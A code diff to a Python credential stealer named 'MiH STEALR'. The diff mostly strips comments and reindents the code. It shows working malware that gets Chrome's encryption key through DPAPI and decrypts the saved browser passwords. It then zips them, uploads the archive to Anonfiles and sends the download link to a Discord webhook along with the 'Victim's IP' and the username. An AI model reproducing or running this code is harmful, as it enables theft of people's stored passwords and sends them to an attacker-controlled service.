@@ -10,8 +10,6 @@ import zipfile
 import os
 
 def get_chrome_datetime(chromedate):
-    """Return a `datetime.datetime` object from a chrome format datetime
-    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
 def get_encryption_key():
@@ -22,32 +20,21 @@ def get_encryption_key():
         local_state = f.read()
         local_state = json.loads(local_state)
 
-    # decode the encryption key from Base64
     key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    # remove DPAPI str
     key = key[5:]
-    # return decrypted key that was originally encrypted
-    # using a session key derived from current user's logon credentials
-    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
 
 def decrypt_password(password, key):
     try:
-        # get the initialization vector
         iv = password[3:15]
         password = password[15:]
-        # generate cipher
         cipher = AES.new(key, AES.MODE_GCM, iv)
-        # decrypt password
         return cipher.decrypt(password)[:-16].decode()
     except:
         try:
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
         except:
-            # not supported
             return ""
-        
 
 def main():
     key = get_encryption_key()
@@ -57,7 +44,6 @@ def main():
     db = sqlite3.connect(filename)
     cursor = db.cursor()
 
-    # Créer un fichier texte pour écrire les données décryptées
     with open('decrypted_passwords.txt', 'w', encoding='utf-8') as output_file:
         output_file.write("___  ___          _        _         _   _\n")
         output_file.write("|  \\/  |         | |      (_)       | | | |\n")
@@ -93,43 +79,38 @@ def main():
     cursor.close()
     db.close()
     try:
-     os.remove(filename)
+        os.remove(filename)
     except:
         pass
 
-    # Zipper le fichier texte
     with zipfile.ZipFile('decrypted_passwords.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
         zipf.write('decrypted_passwords.txt')
 
     username = os.getenv("USERNAME")
 
-    # Appeler la fonction d'upload vers Anonfiles
     download_link = uploadToAnonfiles('decrypted_passwords.zip')
 
     if download_link:
-        # Votre URL de webhook Discord
         webhook_url = ''
         ip_address = requests.get("https://api.ipify.org/").text
-        # Créer le payload pour le message Discord
         embeds = {
-    "avatar_url": "https://cdn.discordapp.com/attachments/1168866780941389934/1172967173916999810/ab67616d0000b273f9ae145ca74784398c3b6c9b.png?ex=65623dce&is=654fc8ce&hm=5846dec8fdea603dd3f7aea0f55fd46819636029b0f9f6daf87715b0f27189e2&",
-    "username": "MiH STEALR",
-    "embeds": [{
-        "title": "YOU'VE REACHED HEAVEN !",
-        "fields": [
-            {"name": "Victim's IP", "value": f"```{ip_address}```", "inline": True},
-            {"name": "Session user", "value": f"```{username}```", "inline": True}
-        ]
-    },
-    {
-        "title": "Credentials",
-        "fields": [
-            {"name": "Retrieved passwords", "value": f"```{download_link}```", "inline": True}
-        ]
-    }]
-}
+            "avatar_url": "https://cdn.discordapp.com/attachments/1168866780941389934/1172967173916999810/ab67616d0000b273f9ae145ca74784398c3b6c9b.png?ex=65623dce&is=654fc8ce&hm=5846dec8fdea603dd3f7aea0f55fd46819636029b0f9f6daf87715b0f27189e2&",
+            "username": "MiH STEALR",
+            "embeds": [{
+                "title": "YOU'VE REACHED HEAVEN !",
+                "fields": [
+                    {"name": "Victim's IP", "value": f"```{ip_address}```", "inline": True},
+                    {"name": "Session user", "value": f"```{username}```", "inline": True}
+                ]
+            },
+            {
+                "title": "Credentials",
+                "fields": [
+                    {"name": "Retrieved passwords", "value": f"```{download_link}```", "inline": True}
+                ]
+            }]
+        }
 
-        # Envoyer le message au webhook Discord
         response = requests.post(webhook_url, json=embeds)
 
         if response.status_code == 200:
@@ -147,5 +128,3 @@ def uploadToAnonfiles(path):
 
 if __name__ == "__main__":
     main()
-
-
